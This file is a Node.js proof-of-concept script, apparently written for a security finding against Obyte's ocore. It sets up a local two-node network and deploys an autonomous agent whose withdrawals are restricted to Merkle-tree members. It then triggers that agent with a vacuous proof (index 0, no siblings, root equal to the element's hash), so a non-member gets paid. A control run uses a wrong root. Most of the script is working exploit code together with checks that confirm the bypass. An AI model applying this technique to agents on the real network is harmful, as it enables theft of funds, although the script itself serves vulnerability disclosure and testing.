// E3-1 — vulnerable-AA demo: whitelist-gated AA (withdrawal only for merkle-tree members) bypassed
// by the vacuous is_valid_merkle_proof proof (finding obyte-2026-08-001, F1 fund-impact class).
// Base: e26-aa-trigger.js (confirmed AA path on the two-node network).
// ROLE=hub  PORT=6611 : posts definition + waypoint + trigger(+data) + waypoints, relays over ws.
// ROLE=node PORT=6612 : receives, validates, saves, stabilizes; the AA fires at stabilization.
// SCENARIO=attack : trigger.data = {element: NOT-A-MEMBER, proof: VACUOUS}  -> the case IF is TRUE
//                   (is_valid_merkle_proof vacuously satisfied) -> the withdrawal pays the attacker.
// SCENARIO=control: trigger.data = {element: X, proof: wrong-root}        -> the case IF is FALSE
//                   -> no case matches -> bounce -> NO withdrawal.
"use strict";
const path = require("path");
const crypto = require("crypto");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const WebSocket = require(O_CORE + "/node_modules/ws");
const { boot, keys, defOf, signHash, sleep, TOTAL } = require("./e17b-boot.js");

const ROLE = process.env.ROLE || "hub";
const PORT = parseInt(process.env.PORT || (ROLE === "hub" ? 6611 : 6612), 10);
const NODE_PORT = parseInt(process.env.NODE_PORT || 6612, 10);
const SCENARIO = process.env.SCENARIO || "attack";
const DATA = path.join(__dirname, ".e31-" + SCENARIO + "-" + ROLE);
const TRIGGER_AMOUNT = 10000;
const WITHDRAW_AMOUNT = 1000;

function sha256b64(str) { return crypto.createHash("sha256").update(str, "utf8").digest("base64"); }

// the AA: only merkle-tree members may withdraw (gated by is_valid_merkle_proof)
function aaDefinition() {
	return ["autonomous agent", {
		bounce_fees: { base: 10000 },
		messages: {
			cases: [
				{
					if: "{is_valid_merkle_proof(trigger.data.element, trigger.data.proof)}",
					messages: [
						{
							app: "payment",
							payload: {
								asset: "base",
								outputs: [{ address: "{trigger.address}", amount: WITHDRAW_AMOUNT }]
							}
						}
					]
				}
			]
		}
	}];
}

function makeSigner(key) {
	const constants = require(O_CORE + "/constants.js");
	return {
		readDefinition: (conn, address, cb) => cb(null, defOf(key)),
		readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
		readPrivateKey: (address, p, cb) => cb(null, Buffer.from(key.priv, "hex")),
	};
}

function dump(ctx, tag) {
	return Promise.all([
		ctx.query("SELECT address, unit, mci FROM aa_addresses ORDER BY address"),
		ctx.query("SELECT mci, unit, address FROM aa_triggers ORDER BY mci"),
		ctx.query("SELECT unit, level, main_chain_index, is_stable, sequence, is_on_main_chain, is_aa_response FROM units ORDER BY main_chain_index"),
		ctx.query("SELECT m.unit, m.app, m.payload FROM messages m ORDER BY m.unit"),
		ctx.query("SELECT o.unit, o.output_index, o.address, o.amount FROM outputs o ORDER BY o.unit, o.output_index"),
	]).then(([aa, trig, units, msgs, outs]) => {
		console.log("[" + tag + "] AA_ADDRESSES:", JSON.stringify(aa));
		console.log("[" + tag + "] UNITS:", JSON.stringify(units.map(r => ({ mci: r.main_chain_index, seq: r.sequence, st: r.is_stable, aa: r.is_aa_response }))));
		console.log("[" + tag + "] PAYMENT-MESSAGES:", JSON.stringify(msgs.filter(m => m.app === "payment").map(m => ({ u: m.unit.slice(0, 12), out: JSON.stringify((m.payload || {}).outputs || []) }))));
		return { aa, trig, units, msgs, outs };
	});
}

function openRelayClient(url) {
	return new Promise((resolve, reject) => {
		const ws = new WebSocket(url, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout")), 8000);
		ws.on("error", (e) => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: { protocol_version: "4.0", alt: "1", library: "ocore", library_version: "0.4.6", program: "e31-lab", program_version: "0.0.1" } }]));
			ws.send(JSON.stringify(["request", { tag: "sub-e31", command: "subscribe", params: { subscription_id: "e31-sub", last_mci: 0, library_version: "0.4.6" } }]));
			setTimeout(() => resolve(ws), 800);
		});
	});
}
function sendJoint(ws, joint) {
	if (ws.readyState === 1) { ws.send(JSON.stringify(["justsaying", { subject: "joint", body: joint }])); return true; }
	return false;
}

function composeGeneric(ctx, key, address, opts) {
	return new Promise((resolve, reject) => {
		ctx.composer.composeJoint({
			paying_addresses: [address],
			signing_addresses: [address],
			outputs: opts.outputs || [{ address, amount: 0 }],
			messages: opts.messages || [],
			signer: makeSigner(key),
			callbacks: {
				ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
				ifError: (e) => reject(new Error(opts.label + " compose error: " + JSON.stringify(e).slice(0, 250))),
				ifNotEnoughFunds: (e) => reject(new Error(opts.label + " not enough funds: " + e)),
			},
		});
	});
}

async function main() {
	const ctx = await boot(DATA, PORT, { bServeAsHub: ROLE === "hub" });
	console.log("[" + ROLE + "/" + SCENARIO + "] booted port", PORT, "genesis", ctx.genesis.unit.slice(0, 12) + "...");

	if (ROLE === "node") {
		console.log("[node] waiting for the hub's unit stream + AA trigger...");
		let aaFired = false;
		for (let i = 0; i < 180; i++) {
			await sleep(1000);
			const trig = await ctx.query("SELECT COUNT(*) AS c FROM aa_triggers");
			const resp = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_aa_response=1");
			if (trig[0].c > 0 || resp[0].c > 0) {
				aaFired = true;
				console.log("[node] AA trigger machinery engaged (aa_triggers=" + trig[0].c + " responses=" + resp[0].c + ")");
			}
			const stable = await ctx.query("SELECT COUNT(*) AS c FROM units WHERE is_stable=1");
			if (aaFired && stable[0].c >= 5) break;
		}
		await sleep(5000);
		const state = await dump(ctx, "node-final");
		const aaAddr = state.aa[0] && state.aa[0].address;
		const outs = state.outs.filter(o => aaAddr && o.address !== aaAddr);
		const responses = state.units.filter(r => r.is_aa_response === 1);
		const withdrawals = outs.filter(o => o.amount === WITHDRAW_AMOUNT);
		console.log("[node] AA_RESPONSES:", JSON.stringify(responses.map(r => ({ u: r.unit.slice(0, 12), seq: r.sequence }))));
		console.log("[node] WITHDRAWAL-OUTPUTS (to non-AA addresses):", JSON.stringify(outs.slice(-6)));
		console.log("[node] SCENARIO-RESULT:", SCENARIO, "withdrawals=" + withdrawals.length,
			SCENARIO === "attack" ? (withdrawals.length >= 1 ? "BYPASS-CONFIRMED" : "BYPASS-FAILED") :
			                                (withdrawals.length === 0 ? "CONTROL-CONFIRMED (no withdrawal)" : "CONTROL-FAILED (withdrawal fired)"));
		const stable = state.units.filter(r => r.is_stable === 1).length;
		console.log("NODE-DONE stable=" + stable + " aa_addresses=" + state.aa.length + " aa_triggers_left=" + state.trig.length);
		const pass = SCENARIO === "attack" ? (withdrawals.length >= 1 && aaFired) : (withdrawals.length === 0 && aaFired);
		process.exit(pass ? 0 : 3);
	}

	// ---- hub ----
	await sleep(3000);
	const ws = await openRelayClient("ws://127.0.0.1:" + NODE_PORT);
	const objectHash = ctx.objectHash;
	const aaDef = aaDefinition();
	const aa_addr = objectHash.getChash160(aaDef);
	console.log("[hub/" + SCENARIO + "] AA address:", aa_addr.slice(0, 16) + "...");

	// the attacker's trigger data
	let element, proof;
	if (SCENARIO === "attack") {
		element = "attacker-NOT-A-MERKLE-MEMBER-2026"; // NOT in any real merkle tree
		proof = "0-" + sha256b64(element); // vacuous proof: index 0, no siblings, root = hash(element)
		console.log("[hub] ATTACK data: element=" + element + " proof=" + proof);
	} else {
		element = "some-member";
		proof = "0-" + sha256b64("different-root"); // wrong root -> IF must be false
		console.log("[hub] CONTROL data: element=" + element + " proof=" + proof + " (wrong root)");
	}

	const seq = [
		{ label: "DEFINITION", key: keys.user, addr: ctx.user_addr, opts: { messages: [{ app: "definition", payload: { address: aa_addr, definition: aaDef } }] } },
		{ label: "WAYPOINT-1", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "TRIGGER", key: keys.user, addr: ctx.user_addr, opts: {
			outputs: [{ address: aa_addr, amount: TRIGGER_AMOUNT }, { address: ctx.user_addr, amount: 0 }],
			messages: [{ app: "data", payload: { element: element, proof: proof } }],
		} },
		{ label: "WAYPOINT-2", key: keys.witness, addr: ctx.witness_addr, opts: {} },
		{ label: "WAYPOINT-3", key: keys.witness, addr: ctx.witness_addr, opts: {} },
	];
	for (const step of seq) {
		const joint = await composeGeneric(ctx, step.key, step.addr, Object.assign({ label: step.label }, step.opts));
		await ctx.validateAndSave(joint, step.label);
		if (sendJoint(ws, joint)) console.log("[hub] relayed " + step.label);
		await sleep(900);
	}
	await sleep(10000);
	const state = await dump(ctx, "hub-final");
	const stable = state.units.filter(r => r.is_stable === 1).length;
	console.log("HUB-DONE stable=" + stable + " aa_addresses=" + state.aa.length + " aa_triggers_left=" + state.trig.length);
	process.exit(state.aa.length >= 1 ? 0 : 4);
}

main().catch(e => { console.error(ROLE + "-ERR:", e); process.exit(2); });
